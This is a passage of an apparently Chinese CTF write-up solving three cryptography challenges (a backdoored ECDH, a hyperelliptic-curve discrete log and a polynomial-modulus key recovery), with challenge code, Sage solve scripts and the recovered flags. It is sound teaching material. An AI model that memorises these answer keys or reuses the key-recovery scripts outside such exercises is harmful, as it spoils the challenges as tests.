class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Parameters</span>():</span><br><span class="line">    w = getPrime(<span class="number">25</span>)</span><br><span class="line">    a = getPrime(<span class="number">15</span>)</span><br><span class="line">    b = getPrime(<span class="number">15</span>)</span><br><span class="line">    x = getPrime(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> w,a,b,x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Malicious_ECDH</span>():</span><br><span class="line">    w,a,b,x = Get_Parameters()</span><br><span class="line">    </span><br><span class="line">    P = getPrime(<span class="number">512</span>)</span><br><span class="line">    A = getRandomNBitInteger(<span class="number">30</span>)</span><br><span class="line">    B = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">    F = GF(P)</span><br><span class="line">    E = EllipticCurve(F, [A, B])</span><br><span class="line">    G = E.random_point()</span><br><span class="line">    k1 = getRandomNBitInteger(<span class="number">50</span>)</span><br><span class="line">    M1 = k1 * G</span><br><span class="line">    </span><br><span class="line">    Y = x * G</span><br><span class="line">    t = randint(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    z = (k1 - w * t) * G + (-a*k1 - b) * Y</span><br><span class="line">    k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">    k2 = bytes_to_long(k2)</span><br><span class="line">    M2 = k2 * G</span><br><span class="line">    k_rec = getRandomNBitInteger(<span class="number">50</span>)</span><br><span class="line">    B_ = k_rec * G</span><br><span class="line">    shared_key1 = k_rec * M2 </span><br><span class="line">    shared_key2 = k2 * B_</span><br><span class="line">    <span class="keyword">assert</span> shared_key1 == shared_key2</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>((w,a,b,x))</span><br><span class="line">    <span class="built_in">print</span>((A,B,P))</span><br><span class="line">    <span class="built_in">print</span>(G.xy())</span><br><span class="line">    <span class="built_in">print</span>(M1.xy())</span><br><span class="line">    <span class="built_in">print</span>(M2.xy())</span><br><span class="line">    <span class="built_in">print</span>(B_.xy())</span><br><span class="line">    <span class="keyword">return</span> shared_key1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">easy_enc</span>(<span class="params">pt,key</span>):</span><br><span class="line">    key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(key[<span class="number">0</span>])).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ct = cipher.encrypt(pad(pt,<span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(ct)</span><br><span class="line">    </span><br><span class="line">key = Malicious_ECDH()</span><br><span class="line">easy_enc(flag,key)</span><br></pre></td></tr></table></figure></blockquote><p>$z = (k_1 - wt) G + (-ak_1 - b)Y=k_1G-wtG+(-ak_1Y-bY)=M_1-wtG-axM_1-bxG$</p><p>又 $key2=k_2B$，求解得到共享key，解AES即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">w, a, b, x = (<span class="number">31889563</span>, <span class="number">31153</span>, <span class="number">28517</span>, <span class="number">763220531</span>)</span><br><span class="line">A, B, P = (<span class="number">1064988096</span>, <span class="number">802063264240</span>, <span class="number">12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527</span>)</span><br><span class="line">G = (<span class="number">359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131</span>, <span class="number">9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770</span>)</span><br><span class="line">M1 = (<span class="number">10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139</span>, <span class="number">7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921</span>)</span><br><span class="line">M2 = (<span class="number">497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693</span>, <span class="number">8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462</span>)</span><br><span class="line">B = (<span class="number">5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256</span>, <span class="number">10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370</span>)</span><br><span class="line">enc = <span class="string">b&#x27;\x1a\xfb\xa2\xe1\x86\x04\xfak\x9a\xa3\xd15\xb8\x16\x1d\xbc\xa9S\xf5;\xfa\xf1\x08dn~\xd4\x94\xa4;^*\xf6\xd7\xf10\xa3\xe1k`\x1f-\xef\x80\x16\x80\x80\xe2&#x27;</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(P), [A, B])</span><br><span class="line">G, M1, M2, B = [E(_) <span class="keyword">for</span> _ <span class="keyword">in</span> [G, M1, M2, _B]]</span><br><span class="line">t = <span class="number">1</span></span><br><span class="line">z = M1 - w*t* G - a*x*M1 - b*x*G</span><br><span class="line">k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">k2 = bytes_to_long(k2)</span><br><span class="line">key = k2 * _B</span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(key[<span class="number">0</span>])).encode()).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;63259ab8-4916-4095-8888-d92c2b003e18&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="magic-dlp"><a href="#magic-dlp" class="headerlink" title="magic_dlp"></a>magic_dlp</h3><blockquote><p>ez hyperelliptic curve problem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = random_prime(<span class="number">2</span> ^ <span class="number">256</span>) </span><br><span class="line">sx = randint(<span class="number">1</span>, p-<span class="number">1</span>) </span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(GF(p)) </span><br><span class="line">f = <span class="built_in">sum</span>(randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">128</span>)*x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*g + <span class="number">1</span> + <span class="number">1</span>)) </span><br><span class="line">sy = f(sx).nth_root(<span class="number">2</span>) </span><br><span class="line">HC = HyperellipticCurve(f, <span class="number">0</span>) </span><br><span class="line">J = HC.jacobian()(GF(p)) </span><br><span class="line">r = randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">40</span>) </span><br><span class="line">D1 = randint(<span class="number">1</span>, p-<span class="number">1</span>)*J(HC((sx, sy))) </span><br><span class="line">D2 = r*D1 </span><br><span class="line"> </span><br><span class="line">key = sha256(<span class="built_in">str</span>(r).encode()).digest() </span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) </span><br><span class="line">ct = aes.encrypt(pad(flag, <span class="number">16</span>)) </span><br><span class="line"><span class="built_in">print</span>(p) </span><br><span class="line"><span class="built_in">print</span>(D1) </span><br><span class="line"><span class="built_in">print</span>(D2) </span><br><span class="line"><span class="built_in">print</span>(b64encode(ct).decode()) </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">28250322002421485740011517298787354630342182411922678481506757706584776470549</span></span><br><span class="line"><span class="string">(x^3 + 14837843646688223376620895623918856834301419791450189502644075689674679307565*x^2 + 11342007530582447297077768070260591643434731986676417772353996440271447424229*x + 17253160355772506039833501683117771635464243068672344160916188778934194482626, y + 11583638164648709615113883733024362701865856309079457013197399476805753481773*x^2 + 14799567073594539924214272546716232642453764116619810153125493046155930087914*x + 9020351128638199743425310619576234999021949822922952447017982687315971687269)</span></span><br><span class="line"><span class="string">(x^3 + 24086141351204484270563731092873802082275121784385117167214060247819862896159*x^2 + 12580133579221229248448771717453263525988015199573816289207551576399335707433*x + 2025561351219044126154032254344655853662339878505961213456370741923912105725, y + 3024337373411188543472600372581043552807342888844351463589310783585361491167*x^2 + 22142729345652208596100988590287276835636512968984185855026844080502870977199*x + 24006419269594097580414614133924457311337109216133817568627246946606650903690)</span></span><br><span class="line"><span class="string">IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>超椭圆曲线下的DLP问题。</p><p>首先恢复 $f$，参考 <a href="https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell">https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell</a> 可用CRT得到 $f$，点数不足够使得不足以恢复正常的 $f$。</p><p>注意到 $p$ 为 256位，而 $f$ 的系数皆为 128位，可以用类似RLWE的方法LLL算出 $f$，最后，$r$ 不到 40位，可以用BSGS算法求解DLP问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">p = <span class="number">28250322002421485740011517298787354630342182411922678481506757706584776470549</span></span><br><span class="line">PR = GF(p)[<span class="string">&quot;x&quot;</span>]</span><br><span class="line">x = PR.gen()</span><br><span class="line">y = <span class="number">0</span></span><br><span class="line">D1 = (</span><br><span class="line">    x</span><br><span class="line">    ^ <span class="number">3</span></span><br><span class="line">    + <span class="number">14837843646688223376620895623918856834301419791450189502644075689674679307565</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">11342007530582447297077768070260591643434731986676417772353996440271447424229</span> * x</span><br><span class="line">    + <span class="number">17253160355772506039833501683117771635464243068672344160916188778934194482626</span>,</span><br><span class="line">    y</span><br><span class="line">    + <span class="number">11583638164648709615113883733024362701865856309079457013197399476805753481773</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">14799567073594539924214272546716232642453764116619810153125493046155930087914</span> * x</span><br><span class="line">    + <span class="number">9020351128638199743425310619576234999021949822922952447017982687315971687269</span>,</span><br><span class="line">)</span><br><span class="line">D2 = (</span><br><span class="line">    x</span><br><span class="line">    ^ <span class="number">3</span></span><br><span class="line">    + <span class="number">24086141351204484270563731092873802082275121784385117167214060247819862896159</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">12580133579221229248448771717453263525988015199573816289207551576399335707433</span> * x</span><br><span class="line">    + <span class="number">2025561351219044126154032254344655853662339878505961213456370741923912105725</span>,</span><br><span class="line">    y + <span class="number">3024337373411188543472600372581043552807342888844351463589310783585361491167</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">22142729345652208596100988590287276835636512968984185855026844080502870977199</span> * x</span><br><span class="line">    + <span class="number">24006419269594097580414614133924457311337109216133817568627246946606650903690</span>,</span><br><span class="line">)</span><br><span class="line">ct = b64decode(<span class="string">&quot;IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0&quot;</span>)</span><br><span class="line"></span><br><span class="line">rems = [D1[<span class="number">1</span>] ^ <span class="number">2</span>, D2[<span class="number">1</span>] ^ <span class="number">2</span>]</span><br><span class="line">mods = [D1[<span class="number">0</span>], D2[<span class="number">0</span>]]</span><br><span class="line">ff = crt(rems, mods)</span><br><span class="line">L = prod(mods)</span><br><span class="line"><span class="built_in">print</span>(ff)</span><br><span class="line"></span><br><span class="line">M = matrix(</span><br><span class="line">    ZZ,</span><br><span class="line">    [</span><br><span class="line">        vector(ff.padded_list(<span class="number">8</span>)),</span><br><span class="line">        vector(L.padded_list(<span class="number">8</span>)),</span><br><span class="line">        vector((L * x).padded_list(<span class="number">8</span>)),</span><br><span class="line">        *<span class="built_in">list</span>(matrix.identity(<span class="number">8</span>) * p),</span><br><span class="line">    ],</span><br><span class="line">)</span><br><span class="line">M = M.augment(vector([<span class="number">1</span>] + [<span class="number">0</span>] * (<span class="number">2</span> + <span class="number">8</span>)))</span><br><span class="line">M[:, -<span class="number">1</span>] *= <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">M = M.LLL()</span><br><span class="line">M[:, -<span class="number">1</span>] /= <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">target = <span class="built_in">next</span>(row <span class="keyword">for</span> row <span class="keyword">in</span> M <span class="keyword">if</span> row[-<span class="number">1</span>] == <span class="number">1</span> <span class="keyword">or</span> row[-<span class="number">1</span>] == -<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> target[-<span class="number">1</span>] == -<span class="number">1</span>:</span><br><span class="line">    target = -target</span><br><span class="line">f = PR(<span class="built_in">list</span>(target[:-<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">HC = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = HC.jacobian()(GF(p))</span><br><span class="line">D1 = J(D1)</span><br><span class="line">D2 = J(D2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># BSGS</span></span><br><span class="line"><span class="comment"># D2=(v+u*M)D1</span></span><br><span class="line"><span class="comment"># D2-vD1=u*M*D1</span></span><br><span class="line">M = <span class="number">2</span>**<span class="number">20</span></span><br><span class="line">lhs = &#123;&#125;</span><br><span class="line">T = D2</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(M)):</span><br><span class="line">    lhs[T] = v</span><br><span class="line">    T = T - D1</span><br><span class="line">MD1 = M * D1</span><br><span class="line">T = <span class="number">0</span> * MD1</span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(M)):</span><br><span class="line">    <span class="keyword">if</span> T <span class="keyword">in</span> lhs:</span><br><span class="line">        v = lhs[T]</span><br><span class="line">        r = u * M + v</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    T = T + MD1</span><br><span class="line"></span><br><span class="line">key = sha256(<span class="built_in">str</span>(r).encode()).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">pt = unpad(aes.decrypt(ct), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;72825d3f-74f0-0a0e-ba1c-895eee99dc29&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Cisticola"><a href="#Cisticola" class="headerlink" title="Cisticola"></a>Cisticola</h3><blockquote><p>Let me tell you a story about polynomial.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Q = [...]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- #!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># Problem by rec, with nothing.</span></span><br><span class="line"><span class="keyword">import</span> Q</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key=key, iv=<span class="built_in">bytes</span>(<span class="built_in">range</span>(<span class="number">16</span>)), mode=AES.MODE_CBC)</span><br><span class="line">enc = cipher.encrypt(pad(secret.flag, <span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;enc = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">Q = R(Q.Q)</span><br><span class="line"></span><br><span class="line">t = <span class="number">17</span></span><br><span class="line">pos = random.sample(<span class="built_in">range</span>(<span class="number">600</span>), t) + [<span class="number">600</span>]</span><br><span class="line">poly = [<span class="built_in">int</span>(os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>(), <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(t)] + [<span class="built_in">int</span>(key.<span class="built_in">hex</span>(), <span class="number">16</span>)]</span><br><span class="line">hint = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t+<span class="number">1</span>):</span><br><span class="line">    hint = (hint + poly[i]*x^pos[i]) % Q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pos = &#125;</span>\n<span class="subst">&#123;hint = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></blockquote><p>多项式上的模运算，先用sage推导多项式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pos = [<span class="number">477</span>, <span class="number">491</span>, <span class="number">210</span>, <span class="number">515</span>, <span class="number">150</span>, <span class="number">142</span>, <span class="number">561</span>, <span class="number">5</span>, <span class="number">475</span>, <span class="number">329</span>, <span class="number">598</span>, <span class="number">274</span>, <span class="number">241</span>, <span class="number">310</span>, <span class="number">108</span>, <span class="number">483</span>, <span class="number">181</span>, <span class="number">600</span>]</span><br><span class="line">Q = [...]</span><br><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line">R = PolynomialRing(GF(p), <span class="string">&#x27;a&#x27;</span>, <span class="number">19</span>)</span><br><span class="line">a = R.gens()</span><br><span class="line">x = a[<span class="number">18</span>]</span><br><span class="line"><span class="comment">#Q = R(Q)</span></span><br><span class="line">Q = ...</span><br><span class="line"></span><br><span class="line">poly = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    poly = (poly + a[i]*x^pos[i]) % Q</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(poly)</span><br></pre></td></tr></table></figure><p>得到429次多项式，将同次项的系数归类，形成A/B矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">eval</span>(<span class="built_in">open</span>(<span class="string">r&#x27;outA.txt&#x27;</span>).readlines()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(f))</span><br><span class="line"></span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">430</span>):</span><br><span class="line">    d.append([])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    x = k[<span class="number">0</span>].strip()</span><br><span class="line">    d[k[<span class="number">1</span>]].append(<span class="built_in">int</span>(x.split(<span class="string">&#x27;*&#x27;</span>)[<span class="number">0</span>]) <span class="keyword">if</span> x[<span class="number">0</span>] != <span class="string">&#x27;a&#x27;</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>([<span class="built_in">len</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> d])</span><br><span class="line"><span class="comment"># len=8: a0/1/3/6/8/10/15/17</span></span><br><span class="line"><span class="comment"># len=9: a0/1/3/6/8/10/15/17+another one</span></span><br><span class="line"></span><br><span class="line">A = d[-<span class="number">8</span>:][::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">eval</span>(<span class="built_in">open</span>(<span class="string">r&#x27;outB.txt&#x27;</span>).readlines()[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> f:</span><br><span class="line">    B.append(k[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">r&#x27;out_final.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;A = <span class="subst">&#123;A&#125;</span>&#x27;</span>,file=g)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;B = <span class="subst">&#123;B[:<span class="number">8</span>]&#125;</span>&#x27;</span>,file=g)</span><br></pre></td></tr></table></figure><p>发现大部分含8项的系数都与a0/a1/a3/a6/a8/a10/a15/a17变量有关，选取8组同次项与结果来做系数对比，求解矩阵方程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">1439830214451992034013504859825496348425599138552815552028441481225682951310010651304957987750558339128649248859043607574873717185051113737355019502086518775325158336557488060325293103679742942484012852921804371007968007851081933599</span></span><br><span class="line"></span><br><span class="line">A = []</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line">A = matrix(Zmod(p), A)</span><br><span class="line">B = vector(Zmod(p), B[:<span class="number">8</span>])</span><br><span class="line">A \ B</span><br><span class="line"></span><br><span class="line"><span class="comment"># (232766905492121523584723111736297361759, 328061273411433237903912759338260875197, 64156810189296343079030126884552967921, 145155918563801313155466268136086691055, 281912772467581204740174686468688405760, 127909413131477378514965968460479471790, 176132068091173488530894527009633409599, 275609957223526193497841020687316070508)</span></span><br></pre></td></tr></table></figure><p>得到key=a17=275609957223526193497841020687316070508，解AES：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">enc = <span 